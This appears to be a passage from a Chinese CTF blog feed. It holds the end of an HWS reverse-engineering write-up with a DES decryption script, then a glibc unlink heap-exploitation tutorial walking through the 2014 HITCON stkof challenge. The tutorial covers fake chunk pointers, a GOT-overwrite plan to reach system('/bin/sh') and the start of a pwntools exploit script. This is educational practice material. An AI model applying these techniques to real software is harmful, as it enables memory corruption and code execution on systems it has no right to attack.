<p>参数分别是ring3传进来的  sub_401005(-1, &amp;v7, aAglfTTon5iSiht, 32, v4, &amp;Buf1);</p>
<p>V7是输入的flag，Buf1是加密的结果，aAglfTTon5iSiht是字符串常量<code>&#125;aglf_T_ton_5i_sihT_yrroS&#123;galf</code>，32是长度</p>
<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20210304114649560.png" alt="image-20210304114649560"></p>
<p>依据相关的加密算法的特征，可判别sub_401710是des spankey函数，sub_401620是des encrypt函数</p>
<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20210304121153289.png" alt="image-20210304121153289"></p>
<h3 id="长调用"><a href="#长调用" class="headerlink" title="长调用"></a>长调用</h3><p>利用call fwrod 返回用 retf</p>
<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20210304121619358.png" alt="image-20210304121619358"></p>
<p>调用的是ring3下图的函数，功能很简单，就是一个简单的xor</p>
<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20210304121657064.png" alt="image-20210304121657064"></p>
<p>解密脚本如下</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">from Crypto.Cipher import DES</span><br><span class="line">from hashlib import md5</span><br><span class="line"></span><br><span class="line">key&#x3D;&#39;&#125;aglf_T_ton_5i_sihT_yrroS&#123;galf&#39;[:8]</span><br><span class="line">c&#x3D;[0xB2, 0xC4, 0x86, 0xD5, 0x54, 0x6C, 0x38, 0xAD, 0xBD, 0x69, 0xD4, 0xE9, 0x44, 0x47, 0x36, 0x21, 0x99, 0x91, 0xFB, 0x13, 0x70, 0xD8, 0x6B, 0xE4, 0x80, 0x12, 0xE2, 0x43, 0x2A, 0x4B, 0x49, 0x8E]</span><br><span class="line">for i in range(0x1e,-1,-1):</span><br><span class="line">    c[i]^&#x3D;c[i+1]</span><br><span class="line">cipher&#x3D;&#39;&#39;.join(list(map(chr,c)))</span><br><span class="line">des&#x3D;DES.new(key)</span><br><span class="line">flag&#x3D;des.decrypt(cipher)</span><br><span class="line">print(flag)</span><br><span class="line">print(md5(flag).hexdigest())</span><br></pre></td></tr></table></figure>







<h1 id="参考链接："><a href="#参考链接：" class="headerlink" title="参考链接："></a>参考链接：</h1><p><a href="https://xuanxuanblingbling.github.io/ctf/pwn/2021/02/01/hws/#">https://xuanxuanblingbling.github.io/ctf/pwn/2021/02/01/hws/#</a></p>
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>HWS</tag>
      </tags>
  </entry>
  <entry>
    <title>Unlink</title>
    <url>/2021/02/10/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8/Linux-Pwn/Unlink/</url>
    <content><![CDATA[<h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>我们在利用 unlink 所造成的漏洞时，其实就是对 chunk 进行内存布局，然后借助 unlink 操作来达成修改指针的效果。</p>
<a id="more"></a>

<p>我们先来简单回顾一下 unlink 的目的与过程，其目的是把一个双向链表中的空闲块拿出来（例如 free 时和目前物理相邻的 free chunk 进行合并）。其基本的过程如下</p>
<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20210922154910245.png" alt="image-20210922154910245"></p>
<p>下面我们首先介绍一下 unlink 最初没有防护时的利用方法，然后介绍目前利用 unlink 的方式。</p>
<h3 id="古老的unlink"><a href="#古老的unlink" class="headerlink" title="古老的unlink"></a>古老的unlink</h3><p>在最初 unlink 实现的时候，其实是没有对 chunk 的 size 检查和双向链表检查的，即没有如下检查代码。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F; 由于 P 已经在双向链表中，所以有两个地方记录其大小，所以检查一下其大小是否一致(size检查)</span><br><span class="line">if (__builtin_expect (chunksize(P) !&#x3D; prev_size (next_chunk(P)), 0))      \</span><br><span class="line">      malloc_printerr (&quot;corrupted size vs. prev_size&quot;);               \</span><br><span class="line">&#x2F;&#x2F; 检查 fd 和 bk 指针(双向链表完整性检查)</span><br><span class="line">if (__builtin_expect (FD-&gt;bk !&#x3D; P || BK-&gt;fd !&#x3D; P, 0))                      \</span><br><span class="line">  malloc_printerr (check_action, &quot;corrupted double-linked list&quot;, P, AV);  \</span><br><span class="line"></span><br><span class="line">  &#x2F;&#x2F; largebin 中 next_size 双向链表完整性检查 </span><br><span class="line">              if (__builtin_expect (P-&gt;fd_nextsize-&gt;bk_nextsize !&#x3D; P, 0)              \</span><br><span class="line">                || __builtin_expect (P-&gt;bk_nextsize-&gt;fd_nextsize !&#x3D; P, 0))    \</span><br><span class="line">              malloc_printerr (check_action,                                      \</span><br><span class="line">                               &quot;corrupted double-linked list (not small)&quot;,    \</span><br><span class="line">                               P, AV);</span><br></pre></td></tr></table></figure>

<p><strong>这里我们以 32 位为例</strong>，假设堆内存最初的布局是下面的样子</p>
<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/old_unlink_vul.png" alt="img"></p>
<p>现在有物理空间连续的两个 chunk（Q，Nextchunk），其中 Q 处于使用状态、Nextchunk 处于释放状态。那么如果我们通过某种方式（<strong>比如溢出</strong>）将 Nextchunk 的 fd 和 bk 指针修改为指定的值。则当我们 free(Q) 时</p>
<ul>
<li>glibc 判断这个块是 small chunk</li>
<li>判断前向合并，发现前一个 chunk 处于使用状态，不需要前向合并</li>
<li>判断后向合并，发现后一个 chunk 处于空闲状态，需要合并</li>
<li>继而对 Nextchunk 采取 unlink 操作</li>
</ul>
<p>那么 unlink 具体执行的效果是什么样子呢？我们可以来分析一下</p>
<ul>
<li>FD=P-&gt;fd = target addr -12</li>
<li>BK=P-&gt;bk = expect value</li>
<li>FD-&gt;bk = BK，即 *(target addr-12+12)=BK=expect value</li>
<li>BK-&gt;fd = FD，即 *(expect value +8) = FD = target addr-12</li>
</ul>
<p><strong>看起来我们似乎可以通过 unlink 直接实现任意地址读写的目的，但是我们还是需要确保 expect value +8 地址具有可写的权限。</strong></p>
<p>比如说我们将 target addr 设置为某个 got 表项，那么当程序调用对应的 libc 函数时，就会直接执行我们设置的值（expect value）处的代码。<strong>需要注意的是，expect value+8 处的值被破坏了，需要想办法绕过。</strong></p>
<h3 id="当前的-unlink"><a href="#当前的-unlink" class="headerlink" title="当前的 unlink"></a>当前的 unlink</h3><p><strong>但是，现实是残酷的。。</strong>我们刚才考虑的是没有检查的情况，但是一旦加上检查，就没有这么简单了。我们看一下对 fd 和 bk 的检查</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F; fd bk</span><br><span class="line">if (__builtin_expect (FD-&gt;bk !&#x3D; P || BK-&gt;fd !&#x3D; P, 0))                      \</span><br><span class="line">  malloc_printerr (check_action, &quot;corrupted double-linked list&quot;, P, AV);  \</span><br></pre></td></tr></table></figure>

<p>此时</p>
<ul>
<li>FD-&gt;bk = target addr - 12 + 12=target_addr</li>
<li>BK-&gt;fd = expect value + 8</li>
</ul>
<p>那么我们上面所利用的修改 GOT 表项的方法就可能不可用了。但是我们可以通过伪造的方式绕过这个机制。</p>
<p>首先我们通过覆盖，将 nextchunk 的 FD 指针指向了 fakeFD，将 nextchunk 的 BK 指针指向了 fakeBK 。那么为了通过验证，我们需要</p>
<ul>
<li><code>fakeFD -&gt; bk == P</code> &lt;=&gt; <code>*(fakeFD + 12) == P</code></li>
<li><code>fakeBK -&gt; fd == P</code> &lt;=&gt; <code>*(fakeBK + 8) == P</code></li>
</ul>
<p>当满足上述两式时，可以进入 Unlink 的环节，进行如下操作：</p>
<ul>
<li><code>fakeFD -&gt; bk = fakeBK</code> &lt;=&gt; <code>*(fakeFD + 12) = fakeBK</code></li>
<li><code>fakeBK -&gt; fd = fakeFD</code> &lt;=&gt; <code>*(fakeBK + 8) = fakeFD</code></li>
</ul>
<p>如果让 fakeFD + 12 和 fakeBK + 8 指向同一个指向 P 的指针，那么：</p>
<ul>
<li><code>*P = P - 8</code></li>
<li><code>*P = P - 12</code></li>
</ul>
<p>即通过此方式，P 的指针指向了比自己低 12 的地址处。此方法虽然不可以实现任意地址写，但是可以修改指向 chunk 的指针，这样的修改是可以达到一定的效果的。</p>
<p>如果我们想要使得两者都指向 P，只需要按照如下方式修改即可</p>
<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/new_unlink_vul.png" alt="img"></p>
<p>需要注意的是，这里我们并没有违背下面的约束，因为 P 在 Unlink 前是指向正确的 chunk 的指针。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F; 由于P已经在双向链表中，所以有两个地方记录其大小，所以检查一下其大小是否一致。</span><br><span class="line">   if (__builtin_expect (chunksize(P) !&#x3D; prev_size (next_chunk(P)), 0))      \</span><br><span class="line">     malloc_printerr (&quot;corrupted size vs. prev_size&quot;);               \</span><br></pre></td></tr></table></figure>

<p><strong>此外，其实如果我们设置 next chunk 的 fd 和 bk 均为 nextchunk 的地址也是可以绕过上面的检测的。但是这样的话，并不能达到修改指针内容的效果。</strong></p>
<h2 id="利用思路"><a href="#利用思路" class="headerlink" title="利用思路"></a>利用思路</h2><h3 id="条件"><a href="#条件" class="headerlink" title="条件"></a>条件</h3><ol>
<li>UAF ，可修改 free 状态下 smallbin 或是 unsorted bin 的 fd 和 bk 指针</li>
<li>已知位置存在一个指针指向可进行 UAF 的 chunk</li>
</ol>
<h3 id="效果"><a href="#效果" class="headerlink" title="效果"></a>效果</h3><p>使得已指向 UAF chunk 的指针 ptr 变为 ptr - 0x18</p>
<h3 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h3><p>设指向可 UAF chunk 的指针的地址为 ptr</p>
<ol>
<li>修改 fd 为 ptr - 0x18</li>
<li>修改 bk 为 ptr - 0x10</li>
<li>触发 unlink</li>
</ol>
<p>ptr 处的指针会变为 ptr - 0x18。</p>
<h2 id="例题-2014-HITCON-stkof"><a href="#例题-2014-HITCON-stkof" class="headerlink" title="例题 2014 HITCON stkof"></a>例题 2014 HITCON stkof</h2><p><a href="https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/heap/unlink/2014_hitcon_stkof">题目链接</a></p>
<p>查看基本信息如下</p>
<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20210813094617281.png" alt="image-20210813094617281"></p>
<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20210813094626102.png" alt="image-20210813094626102"></p>
<p>可以看出程序为64位 主要开启了 Canary和NX保护</p>
<p>Partial RELRO，可以修改got表</p>
<h3 id="基本功能如下"><a href="#基本功能如下" class="headerlink" title="基本功能如下"></a>基本功能如下</h3><p>程序存在 4 个功能，经过 IDA 分析后可以分析功能如下</p>
<ul>
<li>alloc：输入 size，分配 size 大小的内存，并在 bss 段记录对应 chunk 的指针，假设其为 global</li>
<li>read_in：根据指定索引，向分配的内存处读入数据，数据长度可控，<strong>这里存在堆溢出的情况</strong></li>
<li>free：根据指定索引，释放已经分配的内存块</li>
<li>useless：这个功能并没有什么卵用，本来以为是可以输出内容，结果什么也没有输出</li>
</ul>
<h3 id="函数信息如下"><a href="#函数信息如下" class="headerlink" title="函数信息如下"></a>函数信息如下</h3><p>main函数</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">__int64 __fastcall main(__int64 a1, char **a2, char **a3)</span><br><span class="line">&#123;</span><br><span class="line">  int choice; &#x2F;&#x2F; eax</span><br><span class="line">  signed int v5; &#x2F;&#x2F; [rsp+Ch] [rbp-74h]</span><br><span class="line">  char nptr; &#x2F;&#x2F; [rsp+10h] [rbp-70h]</span><br><span class="line">  unsigned __int64 v7; &#x2F;&#x2F; [rsp+78h] [rbp-8h]</span><br><span class="line"></span><br><span class="line">  v7 &#x3D; __readfsqword(0x28u);</span><br><span class="line">  alarm(0x78u);</span><br><span class="line">  while ( fgets(&amp;nptr, 10, stdin) )</span><br><span class="line">  &#123;</span><br><span class="line">    choice &#x3D; atoi(&amp;nptr);</span><br><span class="line">    if ( choice &#x3D;&#x3D; 2 )</span><br><span class="line">    &#123;</span><br><span class="line">      v5 &#x3D; fill();</span><br><span class="line">      goto LABEL_14;</span><br><span class="line">    &#125;</span><br><span class="line">    if ( choice &gt; 2 )</span><br><span class="line">    &#123;</span><br><span class="line">      if ( choice &#x3D;&#x3D; 3 )</span><br><span class="line">      &#123;</span><br><span class="line">        v5 &#x3D; free_chunk();</span><br><span class="line">        goto LABEL_14;</span><br><span class="line">      &#125;</span><br><span class="line">      if ( choice &#x3D;&#x3D; 4 )</span><br><span class="line">      &#123;</span><br><span class="line">        v5 &#x3D; print();</span><br><span class="line">        goto LABEL_14;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    else if ( choice &#x3D;&#x3D; 1 )</span><br><span class="line">    &#123;</span><br><span class="line">      v5 &#x3D; alloc();</span><br><span class="line">      goto LABEL_14;</span><br><span class="line">    &#125;</span><br><span class="line">    v5 &#x3D; -1;</span><br><span class="line">LABEL_14:</span><br><span class="line">    if ( v5 )</span><br><span class="line">      puts(&quot;FAIL&quot;);</span><br><span class="line">    else</span><br><span class="line">      puts(&quot;OK&quot;);</span><br><span class="line">    fflush(stdout);</span><br><span class="line">  &#125;</span><br><span class="line">  return 0LL;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>用于控制数据流将 stdin转化为整型，根据输入的调用不同函数</p>
<p>输入1即进入alloc()函数</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">signed __int64 alloc()</span><br><span class="line">&#123;</span><br><span class="line">  __int64 size; &#x2F;&#x2F; [rsp+0h] [rbp-80h]</span><br><span class="line">  char *v2; &#x2F;&#x2F; [rsp+8h] [rbp-78h]</span><br><span class="line">  char s; &#x2F;&#x2F; [rsp+10h] [rbp-70h]</span><br><span class="line">  unsigned __int64 v4; &#x2F;&#x2F; [rsp+78h] [rbp-8h]</span><br><span class="line"></span><br><span class="line">  v4 &#x3D; __readfsqword(0x28u);</span><br><span class="line">  fgets(&amp;s, 16, stdin);</span><br><span class="line">  size &#x3D; atoll(&amp;s);</span><br><span class="line">  v2 &#x3D; (char *)malloc(size);</span><br><span class="line">  if ( !v2 )</span><br><span class="line">    return 0xFFFFFFFFLL;</span><br><span class="line">  globals[++cnt] &#x3D; v2;</span><br><span class="line">  printf(&quot;%d\n&quot;, (unsigned int)cnt, size);</span><br><span class="line">  return 0LL;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>将stdin转换为整型作为size，然后malloc堆空间，返回的地址根据索引存入globals，且有++cnt，因此索引从1开始。</p>
<p>输入2即进入fill()函数</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">signed __int64 fill()</span><br><span class="line">&#123;</span><br><span class="line">  signed __int64 result; &#x2F;&#x2F; rax</span><br><span class="line">  int i; &#x2F;&#x2F; eax</span><br><span class="line">  unsigned int idx; &#x2F;&#x2F; [rsp+8h] [rbp-88h]</span><br><span class="line">  __int64 size; &#x2F;&#x2F; [rsp+10h] [rbp-80h]</span><br><span class="line">  char *ptr; &#x2F;&#x2F; [rsp+18h] [rbp-78h]</span><br><span class="line">  char s; &#x2F;&#x2F; [rsp+20h] [rbp-70h]</span><br><span class="line">  unsigned __int64 v6; &#x2F;&#x2F; [rsp+88h] [rbp-8h]</span><br><span class="line"></span><br><span class="line">  v6 &#x3D; __readfsqword(0x28u);</span><br><span class="line">  fgets(&amp;s, 16, stdin);</span><br><span class="line">  idx &#x3D; atol(&amp;s);</span><br><span class="line">  if ( idx &gt; 1048576 )</span><br><span class="line">    return 0xFFFFFFFFLL;</span><br><span class="line">  if ( !globals[idx] )</span><br><span class="line">    return 0xFFFFFFFFLL;</span><br><span class="line">  fgets(&amp;s, 16, stdin);</span><br><span class="line">  size &#x3D; atoll(&amp;s);</span><br><span class="line">  ptr &#x3D; globals[idx];</span><br><span class="line">  for ( i &#x3D; fread(ptr, 1uLL, size, stdin); i &gt; 0; i &#x3D; fread(ptr, 1uLL, size, stdin) )</span><br><span class="line">  &#123;</span><br><span class="line">    ptr +&#x3D; i;</span><br><span class="line">    size -&#x3D; i;</span><br><span class="line">  &#125;</span><br><span class="line">  if ( size )</span><br><span class="line">    result &#x3D; 0xFFFFFFFFLL;</span><br><span class="line">  else</span><br><span class="line">    result &#x3D; 0LL;</span><br><span class="line">  return result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>根据索引在globals数组获取地址，并通过修改堆的内容，size可控并且没有限制长度，存在堆溢出漏洞。</p>
<p>输入3 进入free_chunk()函数</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">signed __int64 free_chunk()</span><br><span class="line">&#123;</span><br><span class="line">  unsigned int idx; &#x2F;&#x2F; [rsp+Ch] [rbp-74h]</span><br><span class="line">  char s; &#x2F;&#x2F; [rsp+10h] [rbp-70h]</span><br><span class="line">  unsigned __int64 v3; &#x2F;&#x2F; [rsp+78h] [rbp-8h]</span><br><span class="line"></span><br><span class="line">  v3 &#x3D; __readfsqword(0x28u);</span><br><span class="line">  fgets(&amp;s, 16, stdin);</span><br><span class="line">  idx &#x3D; atol(&amp;s);</span><br><span class="line">  if ( idx &gt; 0x100000 )</span><br><span class="line">    return 0xFFFFFFFFLL;</span><br><span class="line">  if ( !globals[idx] )</span><br><span class="line">    return 0xFFFFFFFFLL;</span><br><span class="line">  free(globals[idx]);</span><br><span class="line">  globals[idx] &#x3D; 0LL;</span><br><span class="line">  return 0LL</span><br></pre></td></tr></table></figure>

<p>根据索引在globals数组获取地址，再free空间。</p>
<h3 id="IO缓存区问题分析"><a href="#IO缓存区问题分析" class="headerlink" title="IO缓存区问题分析"></a>IO缓存区问题分析</h3><p>值得注意的是，由于程序本身没有进行 setbuf 操作，所以在执行输入输出操作的时候会申请缓冲区。这里经过测试，会申请两个缓冲区，分别大小为 1024 和 1024。具体如下，可以进行调试查看</p>
<p>初次调用 fgets 时，malloc 会分配缓冲区 1024 大小。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">*RAX  0x0</span><br><span class="line">*RBX  0x400</span><br><span class="line">*RCX  0x7ffff7b03c34 (__fxstat64+20) ◂— cmp    rax, -0x1000 &#x2F;* &#39;H&#x3D;&#39; *&#x2F;</span><br><span class="line">*RDX  0x88</span><br><span class="line">*RDI  0x400</span><br><span class="line">*RSI  0x7fffffffd860 ◂— 0x16</span><br><span class="line">*R8   0x1</span><br><span class="line">*R9   0x0</span><br><span class="line">*R10  0x7ffff7fd2700 ◂— 0x7ffff7fd2700</span><br><span class="line">*R11  0x246</span><br><span class="line">*R12  0xa</span><br><span class="line">*R13  0x9</span><br><span class="line"> R14  0x0</span><br><span class="line">*R15  0x7ffff7dd18e0 (_IO_2_1_stdin_) ◂— 0xfbad2288</span><br><span class="line">*RBP  0x7ffff7dd18e0 (_IO_2_1_stdin_) ◂— 0xfbad2288</span><br><span class="line">*RSP  0x7fffffffd858 —▸ 0x7ffff7a7a1d5 (_IO_file_doallocate+85) ◂— mov    rsi, rax</span><br><span class="line">*RIP  0x7ffff7a91130 (malloc) ◂— push   rbp</span><br><span class="line">─────────────────────────────────────────────────────────────[ DISASM ]─────────────────────────────────────────────────────────────</span><br><span class="line"> ► 0x7ffff7a91130 &lt;malloc&gt;        push   rbp &lt;0x7ffff7dd18e0&gt;</span><br><span class="line">...，省略</span><br><span class="line"> ► f 0     7ffff7a91130 malloc</span><br><span class="line">   f 1     7ffff7a7a1d5 _IO_file_doallocate+85</span><br><span class="line">   f 2     7ffff7a88594 _IO_doallocbuf+52</span><br><span class="line">   f 3     7ffff7a8769c _IO_file_underflow+508</span><br><span class="line">   f 4     7ffff7a8860e _IO_default_uflow+14</span><br><span class="line">   f 5     7ffff7a7bc6a _IO_getline_info+170</span><br><span class="line">   f 6     7ffff7a7bd78</span><br><span class="line">   f 7     7ffff7a7ab7d fgets+173</span><br><span class="line">   f 8           400d2e</span><br><span class="line">   f 9     7ffff7a2d830 __libc_start_main+240</span><br></pre></td></tr></table></figure>

<p>分配之后，堆如下</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; heap</span><br><span class="line">Top Chunk: 0xe05410</span><br><span class="line">Last Remainder: 0</span><br><span class="line"></span><br><span class="line">0xe05000 PREV_INUSE &#123;</span><br><span class="line">  prev_size &#x3D; 0,</span><br><span class="line">  size &#x3D; 1041,</span><br><span class="line">  fd &#x3D; 0x0,</span><br><span class="line">  bk &#x3D; 0x0,</span><br><span class="line">  fd_nextsize &#x3D; 0x0,</span><br><span class="line">  bk_nextsize &#x3D; 0x0</span><br><span class="line">&#125;</span><br><span class="line">0xe05410 PREV_INUSE &#123;</span><br><span class="line">  prev_size &#x3D; 0,</span><br><span class="line">  size &#x3D; 134129,</span><br><span class="line">  fd &#x3D; 0x0,</span><br><span class="line">  bk &#x3D; 0x0,</span><br><span class="line">  fd_nextsize &#x3D; 0x0,</span><br><span class="line">  bk_nextsize &#x3D; 0x0</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>当分配 16 大小的内存后，堆布局如下</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; heap</span><br><span class="line">Top Chunk: 0xe05430</span><br><span class="line">Last Remainder: 0</span><br><span class="line"></span><br><span class="line">0xe05000 PREV_INUSE &#123;</span><br><span class="line">  prev_size &#x3D; 0,</span><br><span class="line">  size &#x3D; 1041,</span><br><span class="line">  fd &#x3D; 0xa3631,</span><br><span class="line">  bk &#x3D; 0x0,</span><br><span class="line">  fd_nextsize &#x3D; 0x0,</span><br><span class="line">  bk_nextsize &#x3D; 0x0</span><br><span class="line">&#125;</span><br><span class="line">0xe05410 FASTBIN &#123;</span><br><span class="line">  prev_size &#x3D; 0,</span><br><span class="line">  size &#x3D; 33,</span><br><span class="line">  fd &#x3D; 0x0,</span><br><span class="line">  bk &#x3D; 0x0,</span><br><span class="line">  fd_nextsize &#x3D; 0x0,</span><br><span class="line">  bk_nextsize &#x3D; 0x20bd1</span><br><span class="line">&#125;</span><br><span class="line">0xe05430 PREV_INUSE &#123;</span><br><span class="line">  prev_size &#x3D; 0,</span><br><span class="line">  size &#x3D; 134097,</span><br><span class="line">  fd &#x3D; 0x0,</span><br><span class="line">  bk &#x3D; 0x0,</span><br><span class="line">  fd_nextsize &#x3D; 0x0,</span><br><span class="line">  bk_nextsize &#x3D; 0x0</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>当使用 printf 函数，会分配 1024 字节空间，如下</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">*RAX  0x0</span><br><span class="line">*RBX  0x400</span><br><span class="line">*RCX  0x7ffff7b03c34 (__fxstat64+20) ◂— cmp    rax, -0x1000 &#x2F;* &#39;H&#x3D;&#39; *&#x2F;</span><br><span class="line">*RDX  0x88</span><br><span class="line">*RDI  0x400</span><br><span class="line">*RSI  0x7fffffffd1c0 ◂— 0x16</span><br><span class="line"> R8   0x0</span><br><span class="line">*R9   0x0</span><br><span class="line">*R10  0x0</span><br><span class="line">*R11  0x246</span><br><span class="line">*R12  0x1</span><br><span class="line">*R13  0x7fffffffd827 ◂— 0x31 &#x2F;* &#39;1&#39; *&#x2F;</span><br><span class="line"> R14  0x0</span><br><span class="line">*R15  0x400de4 ◂— and    eax, 0x2e000a64 &#x2F;* &#39;%d\n&#39; *&#x2F;</span><br><span class="line">*RBP  0x7ffff7dd2620 (_IO_2_1_stdout_) ◂— 0xfbad2284</span><br><span class="line">*RSP  0x7fffffffd1b8 —▸ 0x7ffff7a7a1d5 (_IO_file_doallocate+85) ◂— mov    rsi, rax</span><br><span class="line">*RIP  0x7ffff7a91130 (malloc) ◂— push   rbp</span><br><span class="line">─────────────────────────────────────────────────────────────[ DISASM ]─────────────────────────────────────────────────────────────</span><br><span class="line"> ► 0x7ffff7a91130 &lt;malloc&gt;       push   rbp &lt;0x7ffff7dd2620&gt;</span><br><span class="line">。。。省略</span><br><span class="line">► f 0     7ffff7a91130 malloc</span><br><span class="line">   f 1     7ffff7a7a1d5 _IO_file_doallocate+85</span><br><span class="line">   f 2     7ffff7a88594 _IO_doallocbuf+52</span><br><span class="line">   f 3     7ffff7a878f8 _IO_file_overflow+456</span><br><span class="line">   f 4     7ffff7a8628d _IO_file_xsputn+173</span><br><span class="line">   f 5     7ffff7a5ae00 vfprintf+3216</span><br><span class="line">   f 6     7ffff7a62899 printf+153</span><br><span class="line">   f 7           4009cd</span><br><span class="line">   f 8           400cb1</span><br><span class="line">   f 9     7ffff7a2d830 __libc_start_main+240</span><br></pre></td></tr></table></figure>

<p>堆布局如下</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; heap</span><br><span class="line">Top Chunk: 0xe05840</span><br><span class="line">Last Remainder: 0</span><br><span class="line"></span><br><span class="line">0xe05000 PREV_INUSE &#123;</span><br><span class="line">  prev_size &#x3D; 0,</span><br><span class="line">  size &#x3D; 1041,</span><br><span class="line">  fd &#x3D; 0xa3631,</span><br><span class="line">  bk &#x3D; 0x0,</span><br><span class="line">  fd_nextsize &#x3D; 0x0,</span><br><span class="line">  bk_nextsize &#x3D; 0x0</span><br><span class="line">&#125;</span><br><span class="line">0xe05410 FASTBIN &#123;</span><br><span class="line">  prev_size &#x3D; 0,</span><br><span class="line">  size &#x3D; 33,</span><br><span class="line">  fd &#x3D; 0x0,</span><br><span class="line">  bk &#x3D; 0x0,</span><br><span class="line">  fd_nextsize &#x3D; 0x0,</span><br><span class="line">  bk_nextsize &#x3D; 0x411</span><br><span class="line">&#125;</span><br><span class="line">0xe05430 PREV_INUSE &#123;</span><br><span class="line">  prev_size &#x3D; 0,</span><br><span class="line">  size &#x3D; 1041,</span><br><span class="line">  fd &#x3D; 0xa4b4f,</span><br><span class="line">  bk &#x3D; 0x0,</span><br><span class="line">  fd_nextsize &#x3D; 0x0,</span><br><span class="line">  bk_nextsize &#x3D; 0x0</span><br><span class="line">&#125;</span><br><span class="line">0xe05840 PREV_INUSE &#123;</span><br><span class="line">  prev_size &#x3D; 0,</span><br><span class="line">  size &#x3D; 133057,</span><br><span class="line">  fd &#x3D; 0x0,</span><br><span class="line">  bk &#x3D; 0x0,</span><br><span class="line">  fd_nextsize &#x3D; 0x0,</span><br><span class="line">  bk_nextsize &#x3D; 0x0</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>此后，无论是输入输出都不会再申请缓冲区了。所以我们最好最初的申请一个 chunk 来把这些缓冲区给申请了，方便之后操作。</p>
<p>但是，比较有意思的是，如果我们是 attach 上去的话，第一个缓冲区分配的大小为 4096 大小。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; heap</span><br><span class="line">Top Chunk: 0x1e9b010</span><br><span class="line">Last Remainder: 0</span><br><span class="line"></span><br><span class="line">0x1e9a000 PREV_INUSE &#123;</span><br><span class="line">  prev_size &#x3D; 0,</span><br><span class="line">  size &#x3D; 4113,</span><br><span class="line">  fd &#x3D; 0x0,</span><br><span class="line">  bk &#x3D; 0x0,</span><br><span class="line">  fd_nextsize &#x3D; 0x0,</span><br><span class="line">  bk_nextsize &#x3D; 0x0</span><br><span class="line">&#125;</span><br><span class="line">0x1e9b010 PREV_INUSE &#123;</span><br><span class="line">  prev_size &#x3D; 0,</span><br><span class="line">  size &#x3D; 135153,</span><br><span class="line">  fd &#x3D; 0x0,</span><br><span class="line">  bk &#x3D; 0x0,</span><br><span class="line">  fd_nextsize &#x3D; 0x0,</span><br><span class="line">  bk_nextsize &#x3D; 0x0</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="基本思路"><a href="#基本思路" class="headerlink" title="基本思路"></a>基本思路</h3><p>根据上面分析，我们在前面先分配一个 chunk 来把缓冲区分配完毕，以免影响之后的操作。</p>
<p>由于程序本身没有 leak，要想执行 system 等函数，我们的首要目的还是先构造 leak，基本思路如下</p>
<ul>
<li>利用 unlink 修改 global[2] 为 &amp;global[2]-0x18。</li>
<li>利用编辑功能修改 global[0] 为 free@got 地址，同时修改 global[1] 为 puts@got 地址，global[2] 为 atoi@got 地址。</li>
<li>修改 <code>free@got</code> 为 <code>puts@plt</code> 的地址，从而当再次调用 <code>free</code> 函数时，即可直接调用 puts 函数。这样就可以泄漏函数内容。</li>
<li>free global[1]，即泄漏 puts@got 内容，从而知道 system 函数地址以及 libc 中 /bin/sh 地址。</li>
<li>修改 <code>atoi@got</code> 为 system 函数地址，再次调用时，输入 /bin/sh 地址即可。</li>
</ul>
<p>代码如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">context.terminal &#x3D; [&#39;gnome-terminal&#39;, &#39;-x&#39;, &#39;sh&#39;, &#39;-c&#39;]</span><br><span class="line">if args[&#39;DEBUG&#39;]:</span><br><span class="line">    context.log_level &#x3D; &#39;debug&#39;</span><br><span class="line">context.binary &#x3D; &quot;.&#x2F;stkof&quot;</span><br><span class="line">stkof &#x3D; ELF(&#39;.&#x2F;stkof&#39;)</span><br><span class="line">if args[&#39;REMOTE&#39;]:</span><br><span class="line">    p &#x3D; remote(&#39;127.0.0.1&#39;, 7777)</span><br><span class="line">else:</span><br><span class="line">    p &#x3D; process(&quot;.&#x2F;stkof&quot;)</span><br><span class="line">log.info(&#39;PID: &#39; + str(proc.pidof(p)[0]))</span><br><span class="line">libc &#x3D; ELF(&#39;.&#x2F;libc.so.6&#39;)</span><br><span class="line">head &#x3D; 0x602140</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def alloc(size):</span><br><span class="line">    p.sendline(&#39;1&#39;)</span><br><span class="line">    p.sendline(str(size))</span><br><span class="line">    p.recvuntil(&#39;OK\n&#39;)</span><br><span 